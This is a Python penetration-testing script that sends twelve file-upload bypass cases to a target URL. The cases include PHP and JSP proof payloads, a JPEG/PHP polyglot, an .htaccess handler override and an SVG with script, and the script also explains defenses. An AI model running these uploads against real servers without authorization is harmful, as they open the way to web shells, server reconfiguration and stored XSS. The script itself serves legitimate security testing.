"""
File Upload Vulnerability Tester
=====================================================
A comprehensive tool to assess file upload security by submitting a battery of
dangerous filename patterns, MIME mismatches, polyglot payloads, and oversized
files, then analyzing server behavior for signs of acceptance.

Why this matters:
  Unrestricted file upload is OWASP Top-10 (A04 Insecure Design). If an attacker
  can upload a web shell (.php/.jsp/.aspx), they gain remote code execution on the
  server. Defenses often check only one signal (extension OR MIME), which attackers
  bypass by manipulating the other.

Usage:
  python file_upload_vuln_tester.py --url https://target/upload --file ./photo.jpg
  python file_upload_vuln_tester.py --url https://target/upload --file ./photo.jpg --cookie "session=abc123"
  python file_upload_vuln_tester.py --url https://target/upload --generate-sample
  python file_upload_vuln_tester.py --url https://target/upload --file ./photo.jpg --output-json report.json

Sample output (abridged):
  === File Upload Vulnerability Tester ===
  Target : https://target/upload
  Tests  : 12

  [HIGH] dual_ext_php: photo.jpg.php | CT: image/jpeg
    Status: 200 | Accepted | "file saved" in response
    Risk: Web shell upload — PHP execution via dual extension bypass

  [MED] null_byte: photo.jpg%00.php | CT: image/jpeg
    Status: 200 | Accepted
    Risk: Null-byte truncation may strip .php on some legacy systems

  [SAFE] baseline: photo.jpg | CT: image/jpeg
    Status: 200 | Accepted | No dangerous extension

  Summary: 4/12 HIGH, 2/12 MED — upload filtering is weak

Limitations:
  - Cannot verify server-side execution without browsing the uploaded path.
  - 200 status does not always mean file was saved; content analysis helps.
  - Auth-protected endpoints need --cookie or --header.
"""

from __future__ import annotations

import argparse
import json
import mimetypes
import os
import ssl
import sys
import urllib.error
import urllib.request
from dataclasses import dataclass, asdict
from typing import Dict, List, Optional, Tuple


# ---------------------------------------------------------------------------
# Data model
# ---------------------------------------------------------------------------
@dataclass
class UploadTest:
    """One test case to send."""
    name: str
    filename: str
    content_type: str
    payload: bytes
    severity_if_accepted: str   # HIGH / MED / LOW / SAFE
    risk_description: str


@dataclass
class UploadResult:
    test_name: str
    filename: str
    content_type: str
    severity: str
    status: int
    response_bytes: int
    accepted: bool
    content_hints: List[str]    # keywords found in response body
    risk: str


# ---------------------------------------------------------------------------
# Multipart encoder (no external deps)
# ---------------------------------------------------------------------------

def build_multipart(
    field_name: str, filename: str, content_type: str, payload: bytes,
    extra_fields: Optional[Dict[str, str]] = None,
) -> Tuple[bytes, str]:
    """
    Build RFC 2046 multipart/form-data body.
    Why manual: avoids requests dependency; gives full control over headers
    which is critical for testing boundary/Content-Disposition tricks.
    """
    boundary = "----VulnTestBoundary9Xm3k7pLq"
    parts: List[bytes] = []

    # Extra form fields (e.g., CSRF token)
    if extra_fields:
        for k, v in extra_fields.items():
            part = (
                f"--{boundary}\r\n"
                f'Content-Disposition: form-data; name="{k}"\r\n\r\n'
                f"{v}\r\n"
            )
            parts.append(part.encode("utf-8"))

    # File part
    file_header = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="{field_name}"; filename="{filename}"\r\n'
        f"Content-Type: {content_type}\r\n\r\n"
    )
    parts.append(file_header.encode("utf-8") + payload + b"\r\n")
    parts.append(f"--{boundary}--\r\n".encode("utf-8"))

    body = b"".join(parts)
    return body, boundary


# ---------------------------------------------------------------------------
# Test case generation — 12 realistic attack vectors
# ---------------------------------------------------------------------------

# Magic bytes for polyglot payloads
JPEG_MAGIC = b"\xff\xd8\xff\xe0"      # JPEG SOI marker
PNG_MAGIC = b"\x89PNG\r\n\x1a\n"      # PNG header
GIF_MAGIC = b"GIF89a"                  # GIF header

# Minimal PHP web shell payload (harmless — just echoes; proves execution)
PHP_PAYLOAD = b'<?php echo "UPLOAD_TEST_EXEC"; ?>'
JSP_PAYLOAD = b'<% out.println("UPLOAD_TEST_EXEC"); %>'


def build_tests(file_path: str) -> List[UploadTest]:
    """
    Generate 12 attack test cases covering common upload bypass techniques.
    Why: real-world filters vary; testing multiple vectors reveals which
    specific defense layer (extension, MIME, magic bytes) is implemented.
    """
    base_name = os.path.basename(file_path)
    name_no_ext, ext = os.path.splitext(base_name)
    ext_lower = ext.lstrip(".").lower() or "bin"

    payload = _load_payload(file_path)
    guessed_type = mimetypes.guess_type(base_name)[0] or "application/octet-stream"

    # Polyglot: prepend real magic bytes before PHP payload
    polyglot_payload = JPEG_MAGIC + b"\x00" * 20 + PHP_PAYLOAD

    tests = [
        # 1. Baseline — should be accepted; validates endpoint works
        UploadTest(
            "baseline", base_name, guessed_type, payload,
            "SAFE", "Normal upload — no dangerous extension",
        ),
        # 2. Dual extension: image.jpg.php — Apache may execute as PHP
        UploadTest(
            "dual_ext_php", f"{base_name}.php", guessed_type, payload,
            "HIGH", "Web shell via dual extension; Apache AddHandler may execute",
        ),
        # 3. Dual extension: .phtml (alternative PHP extension)
        UploadTest(
            "dual_ext_phtml", f"{base_name}.phtml", guessed_type, payload,
            "HIGH", "Alternative PHP extension bypasses .php blocklists",
        ),
        # 4. Null-byte injection: image.jpg%00.php
        # Why: legacy C-based path handling may truncate at null byte
        UploadTest(
            "null_byte", f"{name_no_ext}.{ext_lower}%00.php", guessed_type, payload,
            "MED", "Null-byte truncation on legacy systems strips trailing extension",
        ),
        # 5. Case variation: .PhP — Windows/IIS is case-insensitive
        UploadTest(
            "case_variation", f"{name_no_ext}.PhP", guessed_type, payload,
            "HIGH", "Case-insensitive servers (IIS) may execute .PhP as PHP",
        ),
        # 6. MIME mismatch: send image filename with PHP content-type
        UploadTest(
            "mime_php", base_name, "application/x-php", payload,
            "MED", "MIME type signals PHP but extension is safe — tests MIME-only filtering",
        ),
        # 7. Reverse mismatch: .php filename with image MIME
        UploadTest(
            "ext_php_mime_img", f"{name_no_ext}.php", "image/jpeg", payload,
            "HIGH", "Extension is .php but MIME says image — tests extension-only filtering",
        ),
        # 8. Polyglot: valid JPEG magic bytes + embedded PHP
        # Why: magic-byte validation passes, but if served as PHP, code executes
        UploadTest(
            "polyglot_jpeg_php", f"{name_no_ext}.php.jpg", "image/jpeg", polyglot_payload,
            "HIGH", "Polyglot file passes magic-byte check but contains PHP code",
        ),
        # 9. .htaccess upload — can reconfigure Apache to execute .jpg as PHP
        UploadTest(
            "htaccess", ".htaccess", "text/plain",
            b'AddType application/x-httpd-php .jpg\n',
            "HIGH", ".htaccess can make server execute images as PHP",
        ),
        # 10. SVG with XSS — SVG is XML and can contain JavaScript
        UploadTest(
            "svg_xss", f"{name_no_ext}.svg", "image/svg+xml",
            b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
            "MED", "SVG with embedded JavaScript — stored XSS if served inline",
        ),
        # 11. JSP extension (Java servers)
        UploadTest(
            "jsp_extension", f"{name_no_ext}.jsp", guessed_type, JSP_PAYLOAD,
            "HIGH", "JSP web shell on Java application servers (Tomcat, etc.)",
        ),
        # 12. Oversized filename (255+ chars) — may cause truncation/errors
        UploadTest(
            "long_filename", "A" * 200 + ".php.jpg", guessed_type, payload,
            "LOW", "Long filename may cause truncation revealing .php extension",
        ),
    ]

    return tests


def _load_payload(file_path: str) -> bytes:
    with open(file_path, "rb") as f:
        return f.read()


# ---------------------------------------------------------------------------
# Upload sender with response analysis
# ---------------------------------------------------------------------------

# Keywords that suggest file was successfully stored
SUCCESS_KEYWORDS = ["saved", "uploaded", "success", "created", "stored", "file_url", "location"]
REJECT_KEYWORDS = ["invalid", "rejected", "not allowed", "forbidden", "unsupported", "blocked"]


def send_upload(
    url: str, field: str, test: UploadTest, timeout: int,
    insecure: bool, cookie: str, extra_headers: Dict[str, str],
) -> UploadResult:
    """
    Send one upload test and analyze the response.
    Why we analyze response content: many apps return 200 for both success
    and failure; the body reveals whether the file was actually stored.
    """
    body, boundary = build_multipart(field, test.filename, test.content_type, test.payload)

    headers = {
        "Content-Type": f"multipart/form-data; boundary={boundary}",
        "User-Agent": "Mozilla/5.0 (FileUploadTester/2.0)",
    }
    if cookie:
        headers["Cookie"] = cookie
    headers.update(extra_headers)

    req = urllib.request.Request(url, data=body, headers=headers, method="POST")

    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    try:
        resp = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        status = resp.getcode()
        content = resp.read() or b""
    except urllib.error.HTTPError as e:
        status = e.code
        content = e.read() or b""
    except Exception as e:
        status = 0
        content = str(e).encode()

    # Analyze response for acceptance signals
    content_lower = content.decode("utf-8", errors="ignore").lower()
    hints: List[str] = []
    for kw in SUCCESS_KEYWORDS:
        if kw in content_lower:
            hints.append(f'"{kw}" in response')
    for kw in REJECT_KEYWORDS:
        if kw in content_lower:
            hints.append(f'"{kw}" in response (rejection signal)')

    # Determine acceptance
    http_accepted = 200 <= status < 400
    has_reject_signal = any(kw in content_lower for kw in REJECT_KEYWORDS)
    accepted = http_accepted and not has_reject_signal

    # Assign severity only if accepted; otherwise SAFE
    severity = test.severity_if_accepted if accepted else "SAFE"
    risk = test.risk_description if accepted else "Rejected by server"

    return UploadResult(
        test_name=test.name,
        filename=test.filename,
        content_type=test.content_type,
        severity=severity,
        status=status,
        response_bytes=len(content),
        accepted=accepted,
        content_hints=hints,
        risk=risk,
    )


# ---------------------------------------------------------------------------
# Sample file generator
# ---------------------------------------------------------------------------

def generate_sample(path: str = "sample_upload.jpg") -> str:
    """
    Create a minimal valid JPEG file for testing.
    Why: users may not have a suitable test file handy.
    """
    # Minimal JPEG: SOI + APP0 + minimal data + EOI
    data = (
        b"\xff\xd8\xff\xe0\x00\x10JFIF\x00\x01\x01\x00\x00\x01\x00\x01\x00\x00"
        b"\xff\xd9"
    )
    with open(path, "wb") as f:
        f.write(data)
    return path


# ---------------------------------------------------------------------------
# Reporting
# ---------------------------------------------------------------------------

def print_report(url: str, field: str, results: List[UploadResult]) -> None:
    print("=== File Upload Vulnerability Tester ===")
    print(f"Target : {url}")
    print(f"Field  : {field}")
    print(f"Tests  : {len(results)}\n")

    sev_counts = {"HIGH": 0, "MED": 0, "LOW": 0, "SAFE": 0}

    for r in results:
        sev_counts[r.severity] = sev_counts.get(r.severity, 0) + 1
        tag = r.severity if r.accepted else "SAFE"
        print(f"[{tag}] {r.test_name}: {r.filename} | CT: {r.content_type}")
        print(f"  Status: {r.status} | {'Accepted' if r.accepted else 'Rejected'} | {r.response_bytes} bytes")
        if r.content_hints:
            print(f"  Hints : {'; '.join(r.content_hints)}")
        if r.accepted and r.severity != "SAFE":
            print(f"  Risk  : {r.risk}")
        print()

    # Summary
    print(f"Summary: {sev_counts['HIGH']} HIGH, {sev_counts['MED']} MED, "
          f"{sev_counts['LOW']} LOW, {sev_counts['SAFE']} SAFE")
    print()

    # Educational section
    print("=" * 55)
    print("How file upload attacks work:")
    print("  1. Attacker uploads a script (.php/.jsp) disguised as allowed type")
    print("  2. Server stores it under web root with executable extension")
    print("  3. Attacker browses to uploaded file → remote code execution")
    print("  4. Web shell provides full server control (file read, DB access, pivot)")
    print()
    print("Common bypass techniques tested:")
    print("  - Dual extensions (image.jpg.php) — Apache AddHandler confusion")
    print("  - Null-byte (%00) — truncates path in C-based handlers")
    print("  - Case tricks (.PhP) — bypasses regex on case-insensitive OS")
    print("  - Polyglot files — valid image headers + embedded code")
    print("  - .htaccess upload — reconfigures server to execute images")
    print("  - SVG + JS — stored XSS via inline SVG rendering")
    print()
    print("Defense strategies (layered):")
    print("  1. Allowlist extensions AND validate magic bytes (not just MIME)")
    print("  2. Re-encode images (ImageMagick/Pillow) to strip embedded code")
    print("  3. Store outside web root; serve via download endpoint with safe Content-Type")
    print("  4. Randomize stored filenames; never use user-supplied names")
    print("  5. Set Content-Disposition: attachment on download")
    print("  6. Use CSP to prevent inline script execution from uploaded SVGs")
    print("  7. Scan uploads with antivirus/YARA rules")
    print()
    print("Limitations:")
    print("  - 200 does not always mean stored; response content analysis helps")
    print("  - Cannot confirm execution without browsing the uploaded URL")
    print("  - Auth-protected endpoints require --cookie or --header")


# ---------------------------------------------------------------------------
# CLI
# ---------------------------------------------------------------------------

def main() -> None:
    parser = argparse.ArgumentParser(
        description="Assess file upload security with 12 attack test cases",
    )
    parser.add_argument("--url", help="Upload endpoint URL")
    parser.add_argument("--file", help="Local file to use as base payload")
    parser.add_argument("--field", default="file", help="Form field name (default: file)")
    parser.add_argument("--cookie", default="", help="Cookie header value for auth")
    parser.add_argument("--header", action="append", default=[],
                        help="Extra header (repeatable): 'Name: Value'")
    parser.add_argument("--timeout", type=int, default=10, help="Request timeout (seconds)")
    parser.add_argument("--insecure", action="store_true", help="Skip TLS verification")
    parser.add_argument("--output-json", help="Write JSON report to file")
    parser.add_argument("--generate-sample", action="store_true",
                        help="Generate a minimal JPEG test file and exit")

    args = parser.parse_args()

    if args.generate_sample:
        path = generate_sample()
        print(f"Generated sample file: {path}")
        return

    if not args.url or not args.file:
        parser.error("--url and --file are required (or use --generate-sample)")

    if not os.path.exists(args.file):
        print(f"File not found: {args.file}")
        sys.exit(1)

    # Parse extra headers
    extra_headers: Dict[str, str] = {}
    for h in args.header:
        if ":" in h:
            k, v = h.split(":", 1)
            extra_headers[k.strip()] = v.strip()

    tests = build_tests(args.file)
    results = [
        send_upload(args.url, args.field, t, args.timeout, args.insecure, args.cookie, extra_headers)
        for t in tests
    ]

    print_report(args.url, args.field, results)

    if args.output_json:
        report = {
            "url": args.url,
            "field": args.field,
            "results": [asdict(r) for r in results],
            "summary": {
                "high": sum(1 for r in results if r.severity == "HIGH"),
                "med": sum(1 for r in results if r.severity == "MED"),
                "low": sum(1 for r in results if r.severity == "LOW"),
                "safe": sum(1 for r in results if r.severity == "SAFE"),
            },
        }
        with open(args.output_json, "w", encoding="utf-8") as f:
            json.dump(report, f, indent=2)
        print(f"\nJSON report written to {args.output_json}")


if __name__ == "__main__":
    main()
